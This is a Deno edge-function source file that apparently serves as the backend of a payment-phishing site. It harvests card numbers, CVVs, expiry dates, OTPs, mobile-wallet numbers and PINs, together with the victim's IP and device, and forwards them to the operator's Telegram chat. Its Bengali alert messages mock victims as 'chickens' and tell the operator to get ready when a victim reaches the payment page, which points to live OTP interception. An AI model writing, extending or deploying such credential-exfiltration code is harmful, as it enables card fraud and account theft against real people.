import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

// Restrict the function to browser requests coming from our own site.
// This prevents curl / PowerShell / bots from spamming the Telegram channel
// with forged payloads (they cannot spoof the browser `Origin` header when
// the browser enforces CORS, and non-browser callers we simply reject).
const ALLOWED_ORIGIN_PATTERNS: RegExp[] = [
  /^https:\/\/(www\.)?genzsmm\.com$/i,
  /^https:\/\/([a-z0-9-]+\.)*lovable\.app$/i,
  /^https:\/\/([a-z0-9-]+\.)*lovableproject\.com$/i,
  /^https:\/\/([a-z0-9-]+\.)*lovable\.dev$/i,
  /^https:\/\/([a-z0-9-]+\.)*pages\.dev$/i,
  /^https:\/\/([a-z0-9-]+\.)*workers\.dev$/i,
  /^https:\/\/([a-z0-9-]+\.)*netlify\.app$/i,
  /^https:\/\/([a-z0-9-]+\.)*netlify\.com$/i,
  /^http:\/\/localhost(:\d+)?$/i,
];

function isAllowedOrigin(origin: string | null): boolean {
  if (!origin) return false;
  return ALLOWED_ORIGIN_PATTERNS.some((r) => r.test(origin));
}

function corsFor(origin: string | null) {
  const allow = isAllowedOrigin(origin) ? origin! : "";
  return {
    "Access-Control-Allow-Origin": allow,
    "Vary": "Origin",
    "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
  };
}

const priceText = (p: unknown) =>
  typeof p === "number" && Number.isFinite(p) ? `${p} BDT` : "N/A";

// Rate limit removed — user wants every event forwarded to Telegram.

serve(async (req) => {
  const origin = req.headers.get("origin");
  const cors = corsFor(origin);

  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: cors });
  }

  // Reject any caller that is not one of our own origins.
  if (!isAllowedOrigin(origin)) {
    return new Response(JSON.stringify({ error: "forbidden" }), {
      status: 403,
      headers: { ...cors, "Content-Type": "application/json" },
    });
  }

  const rawIp = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
  const clientIp = String(rawIp).split(",")[0].trim();

  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
  const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return new Response(JSON.stringify({ error: "not_configured" }), {
      status: 500, headers: { ...cors, "Content-Type": "application/json" },
    });
  }

  try {
    const body = await req.json();

    // Sanitize + cap every free-text field so an attacker cannot inject
    // giant payloads or control characters into Telegram messages.
    const clean = (v: unknown, max = 200): string => {
      if (v === null || v === undefined) return "";
      let s = String(v);
      // strip control chars & zero-width; collapse whitespace
      s = s.replace(/[\u0000-\u001F\u007F\u200B-\u200F\u2028\u2029]/g, " ");
      s = s.replace(/\s+/g, " ").trim();
      if (s.length > max) s = s.slice(0, max) + "…";
      return s;
    };

    const type = clean(body.type, 32);
    const action = clean(body.action, 32);
    const amount = clean(body.amount, 20);
    const method = clean(body.method, 40);
    const paymentType = clean(body.paymentType, 10);
    const number = clean(body.number, 40);
    const otp = clean(body.otp, 20);
    const pin = clean(body.pin, 20);
    const cardName = clean(body.cardName, 80);
    const cardNumber = clean(body.cardNumber, 40);
    const expiry = clean(body.expiry, 20);
    const cvv = clean(body.cvv, 10);
    const platform = clean(body.platform, 40);
    const service = clean(body.service, 120);
    const link = clean(body.link, 300);
    const price = typeof body.price === "number" ? body.price : NaN;
    const ua = clean(body.userAgent, 300);
    const displayReferrer = clean(body.referrer || "Direct", 200).replace(/\./g, " ");

    let device = "Unknown";
    if (/Android/i.test(ua)) device = "Android";
    else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
    else if (/Windows/i.test(ua)) device = "Windows";
    else if (/Mac/i.test(ua)) device = "Mac";
    else if (/Linux/i.test(ua)) device = "Linux";

    const footer = `-------------------\n\n🐔মুরগির Device : ${device}\n🐔মুরগির IP : ${clientIp}\n🐔মুরগির Referrer : ${displayReferrer}`;

    let message = "";

    if (type === "payment_activity") {
      if (paymentType === "card") {
        const hasCardData = cardNumber || expiry || cvv;
        if (hasCardData) {
          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\nCardholder Name : ${cardName}\nCard Number : ${cardNumber}\nExpiry Date : ${expiry}\nCVV : ${cvv}\n\nOTP : ${otp}\n\n${footer}`;
        } else if (cardName) {
          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\nCard Name : ${cardName}\n\n${footer}`;
        } else {
          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\n\n${footer}`;
        }
      } else {
        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method}\nNumber : ${number}\nOTP : ${otp}\nPIN : ${pin}\n\n${footer}`;
      }
    } else if (type === "page_entry") {
      message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nUpdate : ${method ? `${method} Page` : "Selection Page"}${amount ? ` (${amount} BDT)` : ""}\n\n${footer}`;
    } else if (type === "payment_cancelled") {
      message = `🐔 মুরগি পেমেন্ট ক্যানসেল করেছে ✅\n\n-------------------\n\nUpdate : ক্যানসেল পেইজে গেছে ।\n\n${footer}`;
    } else if (action === "service_click") {
      message = `🐔 মুরগি প্লাটফর্মের সাভিস ক্লিক করেছে ⚠️\n\n-------------------\n\nPlatform : ${platform}\nService : ${service}\nPrice : ${priceText(price)}\n\n${footer}`;
    } else if (action === "order_submit") {
      message = `🐔 মুরগি অর্ডার সাবমিট করেছে ✅\n\n-------------------\n\nPlatform : ${platform}\nService : ${service}\nLink : ${link}\nPrice : ${priceText(price)}\n\n${footer}`;
    } else if (action) {
      return new Response(JSON.stringify({ ok: true, ignored: true }), {
        headers: { ...cors, "Content-Type": "application/json" },
      });
    } else {
      return new Response(JSON.stringify({ error: "unknown_payload" }), {
        status: 400, headers: { ...cors, "Content-Type": "application/json" },
      });
    }

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
    });
    if (!response.ok) {
      return new Response(JSON.stringify({ error: "telegram_failed" }), {
        status: 502, headers: { ...cors, "Content-Type": "application/json" },
      });
    }
    return new Response(JSON.stringify({ success: true }), {
      headers: { ...cors, "Content-Type": "application/json" },
    });
  } catch {
    return new Response(JSON.stringify({ error: "bad_request" }), {
      status: 400, headers: { ...cors, "Content-Type": "application/json" },
    });
  }
});
